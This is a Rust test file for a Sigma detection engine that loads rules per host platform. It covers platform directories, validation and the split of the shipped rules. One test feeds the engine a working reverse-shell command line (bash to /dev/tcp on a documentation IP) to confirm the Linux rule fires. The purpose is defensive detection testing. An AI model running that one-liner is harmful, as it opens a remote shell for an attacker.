//! `SigmaEngine::load_dir_for` (#980): a host loads only the rules of its own platform, and
//! the platform is where a rule sits **under the rules directory**, never a word in the
//! path of the content root.

use std::path::{Path, PathBuf};

use schema::{EventMeta, ExecEvent};
use sigma::{Platform, SigmaEngine};

const ALL: [Platform; 3] = [Platform::Linux, Platform::Windows, Platform::MacOs];

/// The rules each host runs on a `tree`: **the one place this set is pinned** (#980). macOS runs
/// the Unix-family rules of `linux/` as well as its own; Linux and Windows run only their own.
/// Changing it is a choice: a shared `unix/` directory is the alternative.
const EXPECTED: [(Platform, &[&str]); 3] = [
    (Platform::Linux, &["linux-rule"]),
    (Platform::Windows, &["windows-rule"]),
    (Platform::MacOs, &["linux-rule", "macos-rule"]),
];

fn rule(title: &str) -> String {
    format!(
        "title: {title}\ndescription: d\ntags:\n  - attack.t1059\nlevel: low\nfalsepositives:\n  - none\n\
         detection:\n  selection:\n    Image|endswith: '/x'\n  condition: selection\n"
    )
}

fn write(root: &Path, relative: &str, title: &str) {
    let path = root.join(relative);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, rule(title)).unwrap();
}

/// A rules directory with one rule per platform, each titled after it.
fn tree(root: &Path) {
    write(root, "linux/a.yml", "linux-rule");
    write(root, "windows/a.yml", "windows-rule");
    write(root, "macos/a.yml", "macos-rule");
}

fn titles(engine: &SigmaEngine) -> Vec<String> {
    let mut titles: Vec<String> = engine
        .rule_titles()
        .iter()
        .map(ToString::to_string)
        .collect();
    titles.sort();
    titles
}

#[test]
fn each_platform_loads_only_its_own_directory() {
    let dir = tempfile::tempdir().unwrap();
    tree(dir.path());
    for (platform, expected) in EXPECTED {
        let engine = SigmaEngine::load_dir_for(dir.path(), platform).unwrap();
        assert_eq!(titles(&engine), expected, "{platform:?}");
    }
}

#[test]
fn a_platform_word_in_the_content_root_does_not_change_a_rules_platform() {
    // The root itself is called `linux` and `windows`: judged from the full path, every rule
    // under it would look like both.
    let dir = tempfile::tempdir().unwrap();
    let root = dir
        .path()
        .join("linux")
        .join("windows")
        .join("content")
        .join("rules")
        .join("sigma");
    tree(&root);
    for (platform, expected) in EXPECTED {
        let engine = SigmaEngine::load_dir_for(&root, platform).unwrap();
        assert_eq!(titles(&engine), expected, "{platform:?}");
    }
}

/// The Windows-only PE fields (`OriginalFileName`, #983) are checked against the same platform:
/// a `windows` content root does not let a Linux rule use one, which would never match there.
#[test]
fn a_windows_content_root_does_not_let_a_linux_rule_use_a_windows_only_field() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("windows").join("rules").join("sigma");
    let pe_rule = rule("pe-rule").replace("Image|endswith: '/x'", "OriginalFileName: 'cmd.exe'");
    for relative in ["linux/pe.yml", "windows/pe.yml"] {
        let path = root.join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, &pe_rule).unwrap();
    }
    let linux = SigmaEngine::load_dir_for(&root, Platform::Linux).unwrap();
    assert_eq!(linux.rule_count(), 0);
    let windows = SigmaEngine::load_dir_for(&root, Platform::Windows).unwrap();
    assert_eq!(titles(&windows), ["pe-rule"]);
}

#[test]
fn rules_nested_below_the_platform_directory_load() {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), "linux/sub/deeper/a.yml", "nested");
    let engine = SigmaEngine::load_dir_for(dir.path(), Platform::Linux).unwrap();
    assert_eq!(titles(&engine), ["nested"]);
    let other = SigmaEngine::load_dir_for(dir.path(), Platform::Windows).unwrap();
    assert_eq!(other.rule_count(), 0);
}

#[test]
fn a_rule_outside_a_platform_directory_is_loaded_for_no_platform() {
    let dir = tempfile::tempdir().unwrap();
    tree(dir.path());
    write(dir.path(), "other/a.yml", "other-rule");
    write(dir.path(), "top-level.yml", "top-rule");
    for platform in ALL {
        let engine = SigmaEngine::load_dir_for(dir.path(), platform).unwrap();
        let loaded = titles(&engine);
        assert!(
            !loaded.iter().any(|t| t == "other-rule" || t == "top-rule"),
            "{platform:?}: {loaded:?}"
        );
    }
}

#[test]
fn a_platform_directory_that_does_not_exist_gives_an_engine_with_no_rules() {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), "linux/a.yml", "linux-rule");
    let engine = SigmaEngine::load_dir_for(dir.path(), Platform::Windows).unwrap();
    assert_eq!(engine.rule_count(), 0);
    // macOS without a `macos/` directory still runs `linux/`; with neither, it runs nothing.
    let mac = SigmaEngine::load_dir_for(dir.path(), Platform::MacOs).unwrap();
    assert_eq!(titles(&mac), ["linux-rule"]);
    let empty = tempfile::tempdir().unwrap();
    let none = SigmaEngine::load_dir_for(empty.path(), Platform::MacOs).unwrap();
    assert_eq!(none.rule_count(), 0);
}

#[test]
fn a_rules_directory_that_cannot_be_read_is_an_error_even_without_the_platform_directory() {
    let dir = tempfile::tempdir().unwrap();
    let missing = dir.path().join("nowhere");
    assert!(SigmaEngine::load_dir_for(&missing, Platform::Linux).is_err());
}

#[test]
fn a_rule_that_does_not_validate_is_skipped_not_fatal() {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), "linux/good.yml", "good");
    std::fs::write(dir.path().join("linux/bad.yml"), "title: [unterminated").unwrap();
    let engine = SigmaEngine::load_dir_for(dir.path(), Platform::Linux).unwrap();
    assert_eq!(titles(&engine), ["good"]);
}

#[test]
fn load_dir_is_unchanged_and_still_loads_every_platform() {
    let dir = tempfile::tempdir().unwrap();
    tree(dir.path());
    let engine = SigmaEngine::load_dir(dir.path()).unwrap();
    assert_eq!(
        titles(&engine),
        ["linux-rule", "macos-rule", "windows-rule"]
    );
}

#[test]
fn the_host_platform_is_known_on_the_systems_the_content_covers() {
    let host = Platform::host();
    #[cfg(target_os = "linux")]
    assert_eq!(host, Some(Platform::Linux));
    #[cfg(target_os = "windows")]
    assert_eq!(host, Some(Platform::Windows));
    #[cfg(target_os = "macos")]
    assert_eq!(host, Some(Platform::MacOs));
    #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
    assert_eq!(host, None);
    assert_eq!(Platform::Linux.dir_name(), "linux");
    assert_eq!(Platform::Windows.dir_name(), "windows");
    assert_eq!(Platform::MacOs.dir_name(), "macos");
    assert_eq!(Platform::Linux.rule_dirs(), ["linux"]);
    assert_eq!(Platform::Windows.rule_dirs(), ["windows"]);
    assert_eq!(Platform::MacOs.rule_dirs(), ["macos", "linux"]);
}

// ── the shipped content ──────────────────────────────────────────────────────

fn content_dir() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma")
}

fn rule_files(dir: &Path) -> usize {
    let mut count = 0;
    let mut stack = vec![dir.to_path_buf()];
    while let Some(d) = stack.pop() {
        for entry in std::fs::read_dir(&d).unwrap().flatten() {
            let path = entry.path();
            if path.is_dir() {
                stack.push(path);
            } else if path.extension().is_some_and(|e| e == "yml") {
                count += 1;
            }
        }
    }
    count
}

#[test]
fn the_shipped_content_splits_as_the_expected_set_says() {
    let dir = content_dir();
    let count = |name: &str| rule_files(&dir.join(name));
    for (platform, own) in [
        (Platform::Linux, count("linux")),
        (Platform::Windows, count("windows")),
        // macOS runs its own rules and those of `linux/`.
        (Platform::MacOs, count("macos") + count("linux")),
    ] {
        let engine = SigmaEngine::load_dir_for(&dir, platform).unwrap();
        assert!(own > 0, "{platform:?} ships no rules");
        assert_eq!(engine.rule_count(), own, "{platform:?}");
    }
    // Windows loads nothing of the Unix-family content, and Linux nothing of macOS's or Windows's.
    let windows = SigmaEngine::load_dir_for(&dir, Platform::Windows).unwrap();
    let linux = SigmaEngine::load_dir_for(&dir, Platform::Linux).unwrap();
    let mac = SigmaEngine::load_dir_for(&dir, Platform::MacOs).unwrap();
    let in_both = |a: &SigmaEngine, b: &SigmaEngine| {
        a.rule_titles()
            .iter()
            .filter(|t| b.rule_titles().contains(t))
            .count()
    };
    assert_eq!(in_both(&windows, &linux), 0);
    assert_eq!(in_both(&windows, &mac), 0);
    assert_eq!(
        in_both(&linux, &mac),
        linux.rule_count(),
        "every Linux rule runs on macOS too"
    );
}

#[test]
fn a_linux_rule_runs_on_macos_and_not_on_windows() {
    // `reverse_shell` is a `linux/` rule on `bash -i >& /dev/tcp/...`.
    const LINUX_RULE: &str = "Reverse shell via /dev/tcp or nc/ncat with execution";
    let mut event = exec("/usr/bin/x", "/bin/bash");
    event.cmdline = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1".into();
    let fires = |platform| {
        SigmaEngine::load_dir_for(&content_dir(), platform)
            .unwrap()
            .eval_exec(&event)
            .iter()
            .any(|a| a.title == LINUX_RULE)
    };
    assert!(fires(Platform::Linux));
    assert!(
        fires(Platform::MacOs),
        "macOS keeps running the Unix-family rules of linux/"
    );
    assert!(!fires(Platform::Windows));
}

fn exec(parent: &str, image: &str) -> ExecEvent {
    ExecEvent {
        meta: EventMeta {
            pid: 1,
            comm: "test".into(),
            ..schema::fixtures::meta()
        },
        image_path: image.into(),
        cmdline: "sh -c id".into(),
        parent_image_path: Some(parent.into()),
        ..schema::fixtures::exec()
    }
}

#[test]
fn the_macos_web_server_rule_does_not_fire_on_a_linux_host() {
    const MACOS_RULE: &str = "Web server spawned a shell on macOS";
    let event = exec("/usr/sbin/nginx", "/bin/sh");
    let fires = |platform| {
        SigmaEngine::load_dir_for(&content_dir(), platform)
            .unwrap()
            .eval_exec(&event)
            .iter()
            .any(|a| a.title == MACOS_RULE)
    };
    assert!(fires(Platform::MacOs), "it must still fire on macOS");
    assert!(!fires(Platform::Linux), "the Linux host must not run it");
    assert!(!fires(Platform::Windows));
    // The full-tree loader still runs it everywhere, as before.
    let everywhere = SigmaEngine::load_dir(&content_dir()).unwrap();
    assert!(
        everywhere
            .eval_exec(&event)
            .iter()
            .any(|a| a.title == MACOS_RULE)
    );
}

/// #980: a rules root with a platform word in its own path does not make a rule outside the
/// platform directories valid. `load_rule` alone has no root and keeps reading the whole path.
#[test]
fn a_platform_word_in_the_root_path_is_not_a_platform_directory() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("linux").join("sigma");
    write(&root, "stray/a.yml", "stray-rule");
    write(&root, "b.yml", "root-rule");
    write(&root, "windows/a.yml", "windows-rule");
    let engine = SigmaEngine::load_dir(&root).unwrap();
    assert_eq!(titles(&engine), ["windows-rule"]);
    // The same holds for the host loader's own walk.
    let host = SigmaEngine::load_dir_for(&root, Platform::Windows).unwrap();
    assert_eq!(titles(&host), ["windows-rule"]);
    // Without a root, `load_rule` can only look at the path it is given.
    assert!(SigmaEngine::load_rule(&root.join("stray/a.yml")).is_ok());
}
